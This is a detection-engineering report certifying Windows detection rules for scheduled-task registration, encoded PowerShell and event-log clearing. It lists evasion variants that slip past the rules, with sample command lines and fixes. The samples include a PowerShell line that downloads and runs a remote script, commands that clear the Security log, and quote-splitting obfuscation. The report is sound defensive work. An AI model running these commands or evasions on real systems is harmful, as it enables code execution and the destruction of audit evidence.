# Behaviour certificates

Each detection with a behaviour spec (`behavior.yml` beside its rule) lists the ways its technique appears in the events the rule reads, as variants built from documented behaviour, each with its sources. certify decides every variant over every possible value of every field ([how](CERTIFY.md#behaviour-proofs)):

- **proven**: every event of the variant gets the expected verdict. The search behind it covers every reachable state, so this is a proof, not a sample.
- **known gap**: an event of the variant slips past the rule. The event is shown, replayed through the engine, and checked against the variant's own patterns with Python's `re` and the reference argument parser. It stays listed until the rule changes.
- **stays quiet**: a design exclusion, proven to keep the rule quiet on every event it covers.

CI fails when a gap appears that the spec does not list, when a listed gap closes (the spec must then say `fires`), and when an exclusion fires.

**25 variants over 5 detections: 12 proven for every event, 12 known gaps, 1 exclusion proven quiet.**

## T1053.005 Scheduled Task Registered via PowerShell ScheduledTasks Cmdlets

**Behaviour.** powershell.exe or pwsh.exe registers or changes a scheduled task from its command line: the ScheduledTasks cmdlets, the PSScheduledJob cmdlets, or the Task Scheduler COM object.

[`T1053.005_powershell_scheduled_task_creation`](../detect/detections/T1053.005_powershell_scheduled_task_creation/) · [spec](../detect/detections/T1053.005_powershell_scheduled_task_creation/behavior.yml) · [rule](../detect/detections/T1053.005_powershell_scheduled_task_creation/rule.yml)

| Variant | Expected | Result |
|---|---|---|
| Task registered with an inline action | fires | **proven** for every event |
| Module-qualified cmdlet names | fires | **proven** for every event |
| Environment variable in braces | known gap | slips past (event below) |
| Register-ScheduledJob | known gap | slips past (event below) |
| Task Scheduler COM object | known gap | slips past (event below) |
| Quoted part inside the cmdlet name | known gap | slips past (event below) |

Events found, each replayed through the engine and checked against its variant:

*Environment variable in braces*

```text
CommandLine: powershell.exe -c "Register-ScheduledTask -TaskName Updater -Xml (Get-Content ${env:TEMP}\u.xml -Raw)"
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

*Register-ScheduledJob*

```text
CommandLine: powershell.exe -c "Register-ScheduledJob -Name Updater -ScriptBlock { IEX (iwr http://10.0.0.5/a.ps1) } -Trigger (New-JobTrigger -AtLogOn)"
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

*Task Scheduler COM object*

```text
CommandLine: powershell.exe -c "$s=New-Object -ComObject Schedule.Service;$s.Connect();$t=$s.NewTask(0);$a=$t.Actions.Create(0);$a.Path='C:\Users\Public\u.exe';$s.GetFolder('\').RegisterTaskDefinition('Updater',$t,6,$null,$null,3)"
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

*Quoted part inside the cmdlet name*

```text
CommandLine: powershell.exe -c Register-Sched"uled"Task -TaskName u -Action (New-ScheduledTaskAction -Execute calc.exe)
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **Task registered with an inline action.** The documented way to build and register a task in one command: New-ScheduledTaskAction for the action [[new-scheduledtaskaction](https://learn.microsoft.com/powershell/module/scheduledtasks/new-scheduledtaskaction)], Register-ScheduledTask or Set-ScheduledTask to store it [[register-scheduledtask](https://learn.microsoft.com/powershell/module/scheduledtasks/register-scheduledtask)], in any letter case and order.
- **Module-qualified cmdlet names.** A command can be called by its module-qualified name [[command-precedence](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_command_precedence)], as ScheduledTasks\Register-ScheduledTask.
- **Environment variable in braces.** ${env:TEMP} is the same variable as $env:TEMP: a variable name can always be written in braces [[about-variables](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_variables)]. Here the task comes from XML (Register-ScheduledTask -Xml), so no New-ScheduledTaskAction appears [[register-scheduledtask](https://learn.microsoft.com/powershell/module/scheduledtasks/register-scheduledtask)]. *Gap:* The rule looks for the text $env:TEMP and $env:APPDATA, which the brace form does not contain. *Fix:* Match the variable names with an optional brace, as \$\{?env:(TEMP|APPDATA).
- **Register-ScheduledJob.** Windows PowerShell's Register-ScheduledJob registers a job in Task Scheduler, under Microsoft\Windows\PowerShell\ScheduledJobs [[register-scheduledjob](https://learn.microsoft.com/powershell/module/psscheduledjob/register-scheduledjob?view=powershell-5.1)]. *Gap:* The rule knows only the ScheduledTasks cmdlets. *Fix:* Add Register-ScheduledJob to selection_register, for powershell.exe.
- **Task Scheduler COM object.** The TaskService object (ProgID Schedule.Service) registers a task with RegisterTaskDefinition [[taskservice](https://learn.microsoft.com/windows/win32/taskschd/taskservice), [com-registration](https://learn.microsoft.com/windows/win32/taskschd/registration-trigger-example--scripting-)], from any language that can create COM objects. *Gap:* The rule knows only the ScheduledTasks cmdlets. *Fix:* Add Schedule.Service with RegisterTaskDefinition on the same command line.
- **Quoted part inside the cmdlet name.** PowerShell reads its command from the arguments after the C runtime has split them and dropped the quotes [[crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments)], so Register-Sched"uled"Task on the command line runs Register-ScheduledTask; such quotes change nothing at run time [[dosfuscation](https://www.exploit-db.com/docs/44347)]. *Gap:* The rule looks for the cmdlet names as unbroken text in the raw command line. *Fix:* Remove the quotes from the command line before matching (a normalized field).

</details>

Sources:

- [register-scheduledtask](https://learn.microsoft.com/powershell/module/scheduledtasks/register-scheduledtask): Microsoft Learn, Register-ScheduledTask (ScheduledTasks module)
- [new-scheduledtaskaction](https://learn.microsoft.com/powershell/module/scheduledtasks/new-scheduledtaskaction): Microsoft Learn, New-ScheduledTaskAction (ScheduledTasks module)
- [command-precedence](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_command_precedence): Microsoft Learn, about_Command_Precedence (module-qualified command names)
- [about-variables](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_variables): Microsoft Learn, about_Variables (a variable name in braces, as in ${env:ProgramFiles(x86)})
- [register-scheduledjob](https://learn.microsoft.com/powershell/module/psscheduledjob/register-scheduledjob?view=powershell-5.1): Microsoft Learn, Register-ScheduledJob (scheduled jobs are registered in Task Scheduler under Microsoft\Windows\PowerShell\ScheduledJobs)
- [taskservice](https://learn.microsoft.com/windows/win32/taskschd/taskservice): Microsoft Learn, TaskService object (ProgID Schedule.Service)
- [com-registration](https://learn.microsoft.com/windows/win32/taskschd/registration-trigger-example--scripting-): Microsoft Learn, Registration Trigger Example (Scripting) - CreateObject("Schedule.Service") ... RegisterTaskDefinition
- [crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments): Microsoft Learn, Parsing C command-line arguments (how wmain's argv is split; a quoted string can sit inside an argument)
- [dosfuscation](https://www.exploit-db.com/docs/44347): D. Bohannon, DOSfuscation (2018) - double quotes inside arguments change nothing at run time and stay in the logged command line

## T1059.001 PowerShell Execution With Encoded Command

**Behaviour.** powershell.exe or pwsh.exe is started with -EncodedCommand (any spelling the console host accepts) followed by Base64 text that Convert.FromBase64String decodes.

[`T1059.001_powershell_encoded_command`](../detect/detections/T1059.001_powershell_encoded_command/) · [spec](../detect/detections/T1059.001_powershell_encoded_command/behavior.yml) · [rule](../detect/detections/T1059.001_powershell_encoded_command/rule.yml)

| Variant | Expected | Result |
|---|---|---|
| Documented spellings, plain arguments | fires | **proven** for every event |
| Whole arguments in quotes | fires | **proven** for every event |
| Quoted parts inside an argument | known gap | slips past (event below) |
| White space inside the Base64 text | known gap | slips past (event below) |
| Base64 text shorter than 16 characters | known gap | slips past (event below) |
| Blanks around the switch inside its quotes (pwsh) | known gap | slips past (event below) |
| SCCM client as the parent | stays quiet | **proven** for every event |

Events found, each replayed through the engine and checked against its variant:

*Quoted parts inside an argument*

```text
CommandLine: powershell.exe -NoP -W Hidden -e"n"c VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHAAdQByAHAAbABlACcA
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

*White space inside the Base64 text*

```text
CommandLine: powershell.exe -NoP -W Hidden -enc "VwByAGkA dABlAC0A TwB1AHQA cAB1AHQA IAAnAHAA dQByAHAA bABlACcA"
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

*Base64 text shorter than 16 characters*

```text
CommandLine: powershell.exe -enc YwBhAGwAYwA=
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

*Blanks around the switch inside its quotes (pwsh)*

```text
CommandLine: pwsh.exe -NoProfile "-enc " VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHAAdQByAHAAbABlACcA
Image:       C:\Program Files\PowerShell\7\pwsh.exe
```

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **Documented spellings, plain arguments.** Every switch character and abbreviation the console host accepts [[pwsh-parser](https://github.com/PowerShell/PowerShell/blob/ac15e9a5fa45aa97964321ce08702c97b2414616/src/Microsoft.PowerShell.ConsoleHost/host/msh/CommandLineParameterParser.cs), [pwsh-dash](https://github.com/PowerShell/PowerShell/blob/ac15e9a5fa45aa97964321ce08702c97b2414616/src/System.Management.Automation/engine/parser/CharTraits.cs), [harness](https://www.powershellgallery.com/packages/AtomicTestHarnesses/1.7.0.0/Content/TestHarnesses/T1059.001_PowerShell/OutPowerShellCommandLineParameter.ps1)], any letter case, any arguments around it, no quotes on the command line.
- **Whole arguments in quotes.** Each argument either plain or wrapped whole in double quotes, as scripts and launchers write them [[crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments)].
- **Quoted parts inside an argument.** The C runtime lets a quoted part sit anywhere inside an argument and drops the quotes, so -e"n"c reaches PowerShell as -enc [[crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments)]; the quotes stay in the logged command line and change nothing at run time [[dosfuscation](https://www.exploit-db.com/docs/44347)]. *Gap:* The rule allows quotes only around the switch name and before the Base64 text, so a quote inside the name or inside the Base64 text breaks the match. *Fix:* Remove the quotes from the command line before matching (a normalized field), or allow a quote between every character of the switch and the Base64 run.
- **White space inside the Base64 text.** PowerShell decodes the text with Convert.FromBase64String [[pwsh-base64](https://github.com/PowerShell/PowerShell/blob/ac15e9a5fa45aa97964321ce08702c97b2414616/src/System.Management.Automation/utils/PsUtils.cs)], which ignores tabs, line feeds, carriage returns and spaces anywhere in it [[frombase64](https://learn.microsoft.com/dotnet/api/system.convert.frombase64string)]; spaces and tabs need quotes on the command line, line feeds and carriage returns do not [[crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments)]. *Gap:* The rule needs 16 Base64 characters in one unbroken run. *Fix:* Allow white space between the Base64 characters, or count them across white space.
- **Base64 text shorter than 16 characters.** An encoded command of one to five characters of script, such as calc, is 4 to 12 Base64 characters [[frombase64](https://learn.microsoft.com/dotnet/api/system.convert.frombase64string)]. *Gap:* The rule asks for at least 16 Base64 characters (six characters of script), so a script of five characters or fewer passes. *Fix:* Lower the floor to 4 Base64 characters (one character of script) after the -EncodedCommand spellings.
- **Blanks around the switch inside its quotes (pwsh).** pwsh trims each argument before reading it as a switch [[pwsh-parser](https://github.com/PowerShell/PowerShell/blob/ac15e9a5fa45aa97964321ce08702c97b2414616/src/Microsoft.PowerShell.ConsoleHost/host/msh/CommandLineParameterParser.cs)], so "-enc " with a blank inside the quotes is still -EncodedCommand; the quotes keep the blank in the argument [[crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments)]. *Gap:* The rule wants the Base64 text right after the blanks that follow the switch, but here a quote closes the argument and a second blank run starts the next one. *Fix:* Allow a closing quote and further blanks between the switch and the Base64 text.
- **SCCM client as the parent.** The configuration manager client starts encoded PowerShell as part of normal management. *Why quiet:* filter_sccm excludes exactly C:\Windows\CCM\CcmExec.exe as the parent (in any case); a copy of CcmExec.exe in any other folder still alerts.

</details>

Sources:

- [pwsh-parser](https://github.com/PowerShell/PowerShell/blob/ac15e9a5fa45aa97964321ce08702c97b2414616/src/Microsoft.PowerShell.ConsoleHost/host/msh/CommandLineParameterParser.cs): PowerShell 7 console host, CommandLineParameterParser.cs (GetSwitchKey, MatchSwitch, -EncodedCommand)
- [pwsh-dash](https://github.com/PowerShell/PowerShell/blob/ac15e9a5fa45aa97964321ce08702c97b2414616/src/System.Management.Automation/engine/parser/CharTraits.cs): PowerShell 7, CharTraits.cs (IsDash - the four dash characters)
- [pwsh-base64](https://github.com/PowerShell/PowerShell/blob/ac15e9a5fa45aa97964321ce08702c97b2414616/src/System.Management.Automation/utils/PsUtils.cs): PowerShell 7, PsUtils.cs (StringToBase64Converter.Base64ToString calls Convert.FromBase64String)
- [frombase64](https://learn.microsoft.com/dotnet/api/system.convert.frombase64string): .NET Convert.FromBase64String (tab, line feed, carriage return and space are ignored anywhere; up to two trailing '=')
- [harness](https://www.powershellgallery.com/packages/AtomicTestHarnesses/1.7.0.0/Content/TestHarnesses/T1059.001_PowerShell/OutPowerShellCommandLineParameter.ps1): Red Canary AtomicTestHarnesses, Out-PowerShellCommandLineParameter (powershell.exe switch characters and EncodedCommand abbreviations)
- [crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments): Microsoft Learn, Parsing C command-line arguments (how wmain's argv is split; a quoted string can sit inside an argument)
- [dosfuscation](https://www.exploit-db.com/docs/44347): D. Bohannon, DOSfuscation (2018) - double quotes inside arguments change nothing at run time and stay in the logged command line

## T1685.005 Windows Event Log Clearing via Command Line

**Behaviour.** A process clears or removes a Windows event log: wevtutil cl / clear-log, the PowerShell event log cmdlets and .NET methods, or the ClearEventLog method of WMI's Win32_NTEventlogFile.

[`T1685.005_event_log_clearing`](../detect/detections/T1685.005_event_log_clearing/) · [spec](../detect/detections/T1685.005_event_log_clearing/behavior.yml) · [rule](../detect/detections/T1685.005_event_log_clearing/rule.yml)

| Variant | Expected | Result |
|---|---|---|
| wevtutil cl, plain arguments | fires | **proven** for every event |
| wevtutil cl, whole arguments in quotes | fires | **proven** for every event |
| wevtutil cl, quoted part inside the command word | known gap | slips past (event below) |
| PowerShell event log cmdlets by name | fires | **proven** for every event |
| Quoted part inside the cmdlet name | known gap | slips past (event below) |
| EventLogSession.ClearLog | fires | **proven** for every event |
| WMI ClearEventLog | fires | **proven** for every event |
| EventLog.Clear on the objects of Get-EventLog -List | known gap | slips past (event below) |
| Cmdlet name built at run time | known gap | slips past (event below) |

Events found, each replayed through the engine and checked against its variant:

*wevtutil cl, quoted part inside the command word*

```text
CommandLine: wevtutil c"l" Security
Image:       C:\Windows\System32\wevtutil.exe
```

*Quoted part inside the cmdlet name*

```text
CommandLine: powershell.exe -c Clear-Eve"nt"Log -LogName Security
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

*EventLog.Clear on the objects of Get-EventLog -List*

```text
CommandLine: powershell.exe -c "Get-EventLog -List | Where-Object Log -eq 'Security' | ForEach-Object { $_.Clear() }"
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

*Cmdlet name built at run time*

```text
CommandLine: powershell.exe -c "& ('Clear-Event'+'Log') -LogName Security"
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **wevtutil cl, plain arguments.** The documented command word, short or long, in any letter case, then the log and any options [[wevtutil](https://learn.microsoft.com/windows-server/administration/windows-commands/wevtutil)].
- **wevtutil cl, whole arguments in quotes.** Each argument plain or wrapped whole in double quotes, as scripts write them [[crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments)].
- **wevtutil cl, quoted part inside the command word.** The C runtime lets a quoted part sit anywhere inside an argument and drops the quotes, so c"l" reaches wevtutil as cl [[crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments)]; such quotes change nothing at run time [[dosfuscation](https://www.exploit-db.com/docs/44347)]. *Gap:* The rule allows a quote only before and after the whole command word. *Fix:* Remove the quotes from the command line before matching (a normalized field), or allow a quote between the letters of cl and clear-log.
- **PowerShell event log cmdlets by name.** Clear-EventLog clears a log [[clear-eventlog](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/clear-eventlog?view=powershell-5.1)]; Remove-EventLog and Limit-EventLog remove a log or shorten what it keeps. PowerShell resolves command names in any letter case.
- **Quoted part inside the cmdlet name.** PowerShell reads the command it runs from its arguments after the C runtime has split them and dropped the quotes [[crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments)], so Clear-Eve"nt"Log on the command line runs Clear-EventLog [[clear-eventlog](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/clear-eventlog?view=powershell-5.1)]; such quotes change nothing at run time [[dosfuscation](https://www.exploit-db.com/docs/44347)]. *Gap:* The rule looks for the cmdlet names as unbroken text in the raw command line. *Fix:* Remove the quotes from the command line before matching (a normalized field).
- **EventLogSession.ClearLog.** The .NET method that clears a log by name [[clearlog](https://learn.microsoft.com/dotnet/api/system.diagnostics.eventing.reader.eventlogsession.clearlog)], called from a PowerShell command line.
- **WMI ClearEventLog.** The ClearEventLog method of Win32_NTEventlogFile clears a log [[wmi-clear](https://learn.microsoft.com/previous-versions/windows/desktop/eventlogprov/cleareventlog-method-in-class-win32-nteventlogfile)], from wmic, PowerShell or any other caller.
- **EventLog.Clear on the objects of Get-EventLog -List.** Get-EventLog -List returns System.Diagnostics.EventLog objects [[get-eventlog](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/get-eventlog?view=powershell-5.1)], and their Clear method removes every entry of the log [[eventlog-clear](https://learn.microsoft.com/dotnet/api/system.diagnostics.eventlog.clear)]. *Gap:* The rule knows the cmdlets, ClearLog and ClearEventLog, but not the Clear method of an EventLog object. *Fix:* Add Get-EventLog with -List and .Clear( on the same command line, for powershell.exe.
- **Cmdlet name built at run time.** The call operator runs a command whose name is held in a string [[call-operator](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_operators?view=powershell-5.1)], so the name can be assembled from pieces and never appears whole on the command line. *Gap:* A command-line rule reads only the text that was typed. PowerShell Script Block Logging (event 4104) records the code that actually ran and is where this belongs.

</details>

Sources:

- [wevtutil](https://learn.microsoft.com/windows-server/administration/windows-commands/wevtutil): Microsoft Learn, wevtutil ({cl | clear-log} <Logname> [/bu:<Backup>])
- [clear-eventlog](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/clear-eventlog?view=powershell-5.1): Microsoft Learn, Clear-EventLog (Windows PowerShell 5.1)
- [get-eventlog](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/get-eventlog?view=powershell-5.1): Microsoft Learn, Get-EventLog (-List returns System.Diagnostics.EventLog objects)
- [eventlog-clear](https://learn.microsoft.com/dotnet/api/system.diagnostics.eventlog.clear): .NET, EventLog.Clear (removes all entries from the event log)
- [clearlog](https://learn.microsoft.com/dotnet/api/system.diagnostics.eventing.reader.eventlogsession.clearlog): .NET, EventLogSession.ClearLog
- [wmi-clear](https://learn.microsoft.com/previous-versions/windows/desktop/eventlogprov/cleareventlog-method-in-class-win32-nteventlogfile): Microsoft Learn, ClearEventLog method of the Win32_NTEventlogFile class
- [call-operator](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_operators?view=powershell-5.1): Microsoft Learn, about_Operators (the call operator runs a command whose name is held in a string)
- [crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments): Microsoft Learn, Parsing C command-line arguments (how wmain's argv is split; a quoted string can sit inside an argument)
- [dosfuscation](https://www.exploit-db.com/docs/44347): D. Bohannon, DOSfuscation (2018) - double quotes inside arguments change nothing at run time and stay in the logged command line

## T1685.005 Security Audit Log Cleared (Event 1102)

**Behaviour.** Windows writes event 1102 to the Security log (provider Microsoft-Windows-Eventlog) every time the Security audit log is cleared, whatever tool cleared it.

[`T1685.005_security_log_cleared`](../detect/detections/T1685.005_security_log_cleared/) · [spec](../detect/detections/T1685.005_security_log_cleared/behavior.yml) · [rule](../detect/detections/T1685.005_security_log_cleared/rule.yml)

| Variant | Expected | Result |
|---|---|---|
| Security log cleared | fires | **proven** for every event |

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **Security log cleared.** Event 1102 from Microsoft-Windows-Eventlog in the Security channel, whoever cleared the log and however [[event-1102](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-1102)].

</details>

Sources:

- [event-1102](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-1102): Microsoft Learn, 1102(S) The audit log was cleared

## T1685.005 Windows Event Log Cleared (System Event 104)

**Behaviour.** The event log service writes event 104 (provider Microsoft-Windows-Eventlog) to the System log when a log is cleared, whatever tool cleared it.

[`T1685.005_system_log_cleared`](../detect/detections/T1685.005_system_log_cleared/) · [spec](../detect/detections/T1685.005_system_log_cleared/behavior.yml) · [rule](../detect/detections/T1685.005_system_log_cleared/rule.yml)

| Variant | Expected | Result |
|---|---|---|
| Log cleared, as the event log service writes it | fires | **proven** for every event |
| Provider name in another letter case | fires | **proven** for every event |

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **Log cleared, as the event log service writes it.** Event 104 with the provider name the service writes, Microsoft-Windows-Eventlog [[event-104](https://docs.velociraptor.app/artifact_references/pages/windows.eventlogs.cleared), [sigma-104](https://detection.fyi/sigmahq/sigma/windows/builtin/system/microsoft_windows_eventlog/win_system_eventlog_cleared/)].
- **Provider name in another letter case.** Pipelines and SIEM extractions do not always keep the provider name's case.

</details>

Sources:

- [event-104](https://docs.velociraptor.app/artifact_references/pages/windows.eventlogs.cleared): Velociraptor, Windows.EventLogs.Cleared (System log event 104 and Security log event 1102 mark a cleared log)
- [sigma-104](https://detection.fyi/sigmahq/sigma/windows/builtin/system/microsoft_windows_eventlog/win_system_eventlog_cleared/): SigmaHQ, Eventlog Cleared (System event 104 from Microsoft-Windows-Eventlog)
